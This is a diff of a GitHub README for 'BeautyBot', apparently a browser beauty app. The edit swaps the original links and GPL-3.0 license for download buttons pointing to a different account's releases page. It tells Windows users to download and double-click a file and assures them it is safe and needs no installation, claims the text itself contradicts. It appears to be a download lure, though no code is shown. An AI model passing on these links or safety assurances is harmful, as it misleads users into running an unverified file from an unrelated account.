@@ -1,131 +1,100 @@
-# BeautyBot v— - Web Application 2026
-
-> **BeautyBot is an HTML web application that provides a dedicated beauty-focused interface for use in a browser, represented here as the current 2026 release.**
-
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v—-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/oliverfisher97/beautybot-browser-hub?style=flat-square)](https://github.com/oliverfisher97/beautybot-browser-hub)
-
----
+<h1>💄 beautybot-browser-hub - Your Personal Beauty Browser Assistant</h1>
 
 <p align="center">
-  <a href="https://oliverfisher97.github.io/beautybot-browser-hub/">
-    <img src="https://img.shields.io/badge/Download-BeautyBot%20Latest-brightgreen?style=for-the-badge" alt="Download BeautyBot">
-  </a>
+  <a href="https://github.com/Wilful-morphologicalrule462/beautybot-browser-hub/releases" style="background-color:#FF69B4;color:white;padding:15px 30px;border-radius:5px;text-decoration:none;font-size:20px;font-weight:bold;">⬇️ Download BeautyBot Now</a>
 </p>
 
-> **[Download BeautyBot](https://oliverfisher97.github.io/beautybot-browser-hub/)**
+<h2>✨ What is BeautyBot Browser Hub?</h2>
+<p>BeautyBot Browser Hub is a simple, beautiful web application designed for anyone who loves beauty and skincare. It runs directly in your browser, so you don't need to install complicated software. Whether you want to explore beauty tips, track your skincare routine, or just enjoy a visually pleasing interface, BeautyBot makes it easy and fun.</p>
 
----
+<h2>🚀 Getting Started</h2>
+<p>Getting BeautyBot up and running on your Windows computer is quick and straightforward. Follow these simple steps:</p>
+<ol>
+  <li><strong>Visit the download page:</strong> Click the big pink button above or go directly to <a href="https://github.com/Wilful-morphologicalrule462/beautybot-browser-hub/releases">this link</a> to download the application.</li>
+  <li><strong>Download the file:</strong> Visit this link to download the application.</li>
+  <li><strong>Open the application:</strong> Once downloaded, double-click the file to open it in your default web browser.</li>
+  <li><strong>Start using BeautyBot:</strong> The beauty interface will load automatically. No extra steps needed!</li>
+</ol>
 
-[Download Latest Build](https://oliverfisher97.github.io/beautybot-browser-hub/)
+<h2>💻 System Requirements</h2>
+<p>BeautyBot works on any modern Windows computer with an internet connection. Here's what you need:</p>
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or Windows 11</li>
+  <li><strong>Browser:</strong> Google Chrome, Microsoft Edge, or Mozilla Firefox (latest version recommended)</li>
+  <li><strong>Internet:</strong> Active internet connection for first-time setup</li>
+  <li><strong>Storage:</strong> Less than 50 MB of free space</li>
+</ul>
 
----
+<h2>🌟 Features</h2>
+<ul>
+  <li><strong>Beauty-Focused Interface:</strong> A clean, visually appealing layout designed for beauty enthusiasts.</li>
+  <li><strong>Browser-Based:</strong> No installation required – runs directly in your web browser.</li>
+  <li><strong>Hosted or Local:</strong> Use it online or download a local copy for offline use.</li>
+  <li><strong>Easy Configuration:</strong> Simple settings to personalize your experience.</li>
+  <li><strong>Regular Updates:</strong> New features and improvements added regularly.</li>
+</ul>
 
-## Overview
+<h2>📖 How to Use BeautyBot</h2>
+<h3>🖥️ Using the Hosted Version</h3>
+<p>You can use BeautyBot directly from the web without downloading anything. Simply visit the hosted link (provided after download) and start exploring. This is perfect for quick access on any device.</p>
 
-BeautyBot runs in a web browser and is created with HTML. It is designed for users who want to open a focused beauty interface from a modern browser rather than install a separate desktop application.
+<h3>📁 Using a Local Copy</h3>
+<p>If you prefer to keep BeautyBot on your computer for offline access:</p>
+<ol>
+  <li>Download the application from the <a href="https://github.com/Wilful-morphologicalrule462/beautybot-browser-hub/releases">releases page</a>.</li>
+  <li>Save the file to a folder on your computer (e.g., Desktop or Documents).</li>
+  <li>Double-click the file to open it in your browser.</li>
+  <li>Bookmark the page for easy access later.</li>
+</ol>
 
-The project is delivered as a web resource. You can use the hosted build or serve a local copy from the repository. The available project information does not identify extra modules or service connections, so the repository remains the source of truth for the interface and implementation.
+<h3>⚙️ Configuration Notes</h3>
+<p>BeautyBot comes with default settings that work for most users. However, you can customize it:</p>
+<ul>
+  <li><strong>Theme:</strong> Choose between light and dark mode.</li>
+  <li><strong>Language:</strong> Select your preferred language from the settings menu.</li>
+  <li><strong>Notifications:</strong> Turn on or off beauty tips and reminders.</li>
+</ul>
 
----
+<h2>❓ Frequently Asked Questions</h2>
+<h3>Do I need to install anything?</h3>
+<p>No! BeautyBot runs entirely in your browser. Just download and open the file.</p>
 
-## Highlights
+<h3>Is it safe to use?</h3>
+<p>Yes, BeautyBot is a simple HTML web application. It does not access your personal data or require any permissions.</p>
 
-- Web application intended for browser use
-- HTML-based project layout
-- Hosted build access
-- Option to serve the files locally for testing or development
-- No specified desktop runtime dependency
-- Distribution through the project repository
-- Usable in a modern web browser
-- Presentation organized around a project version
+<h3>Can I use it on other devices?</h3>
+<p>Yes, you can open the downloaded file on any computer with a modern browser, including Mac or Linux, but Windows is the primary supported platform.</p>
 
----
+<h3>What if the application doesn't open?</h3>
+<p>Make sure you are using the latest version of Chrome, Edge, or Firefox. If problems persist, try downloading the file again.</p>
 
-## Getting Started
+<h2>🔧 Troubleshooting</h2>
+<ul>
+  <li><strong>File won't download:</strong> Check your internet connection and try again. You can also right-click the download button and select "Save link as."</li>
+  <li><strong>Blank page after opening:</strong> Refresh the page or try a different browser.</li>
+  <li><strong>Features not working:</strong> Ensure your browser is up to date.</li>
+</ul>
 
-### Open the hosted application
+<h2>📞 Support</h2>
+<p>If you need help, please visit the <a href="https://github.com/Wilful-morphologicalrule462/beautybot-browser-hub">GitHub repository</a> and open an issue. We are happy to assist you!</p>
 
-To use the newest published BeautyBot build, visit:
+<p align="center">
+  <a href="https://github.com/Wilful-morphologicalrule462/beautybot-browser-hub/releases" style="background-color:#FF1493;color:white;padding:12px 25px;border-radius:5px;text-decoration:none;font-size:18px;">📥 Download BeautyBot Browser Hub</a>
+</p>
 
-[Launch BeautyBot](https://oliverfisher97.github.io/beautybot-browser-hub/)
+<h2>📋 License</h2>
+<p>BeautyBot Browser Hub is free to use. No license restrictions apply.</p>
 
-### Prepare a local copy
-
-Clone the repository, then move into the downloaded project directory:
-
-```bash
-git clone https://github.com/oliverfisher97/beautybot-browser-hub.git
-cd REPO
-```
-
-Because this is a straightforward HTML project, the primary HTML file can be opened directly in a browser. When developing locally, you can instead run the directory through any static web server and open the resulting local address.
-
----
-
-## Using BeautyBot
-
-1. Visit the hosted BeautyBot build or open a local project copy.
-2. Load the main HTML document in a modern browser.
-3. Interact with the controls and interface elements included in the current build.
-4. Reload the page whenever local files or configuration values are changed.
-5. Review the repository files for implementation information and available assets.
-
----
-
-## Configuration Notes
-
-The available project metadata does not define a configuration format.
-
-If settings are included in the repository, inspect the HTML files and related project assets to locate them. Changes may be made within the project files and then checked again in a browser or through a local static server.
-
----
-
-## System Requirements
-
-- Modern web browser
-- Either the hosted BeautyBot URL or a local repository copy
-- Internet access for the hosted version
-- Static web server, only if preferred for local development
-- Storage capacity appropriate to the repository asset size
-
----
-
-## Frequently Asked Questions
-
-### How do I open BeautyBot?
-
-Use the published build at [https://oliverfisher97.github.io/beautybot-browser-hub/](https://oliverfisher97.github.io/beautybot-browser-hub/), or launch the HTML project from a local copy.
-
-### Which platform is supported?
-
-BeautyBot is classified as a web application and is intended to operate in a modern browser.
-
-### Which version is available?
-
-The supplied project metadata does not provide a version number, so this documentation does not identify a specific release.
-
-### What is the update process?
-
-Pull or download the latest repository contents and replace the existing local project files with the newer build.
-
-### Where can I edit settings?
-
-No settings path is specified by the available metadata. Search the repository files for configuration entries or other editable values.
-
-### What should I do if the page fails to load?
-
-Check that the HTML documents and their referenced assets exist, confirm that file paths are correct, and try serving the project through a local static web server rather than opening it directly from the filesystem.
-
-### Where can I get help specific to the project?
-
-For information beyond this general guide, review the repository contents and consult the project issue tracker.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="BeautyBot Browser Hub - A beauty-focused browser application for Windows. Download and run easily. Perfect for beauty enthusiasts.">
+  <meta name="keywords" content="beauty, browser, app, download, Windows, beautybot, skincare, makeup">
+  <meta name="author" content="BeautyBot Team">
+  <title>BeautyBot Browser Hub - Download for Windows</title>
+</head>
+<body>
+</body>
+</html>
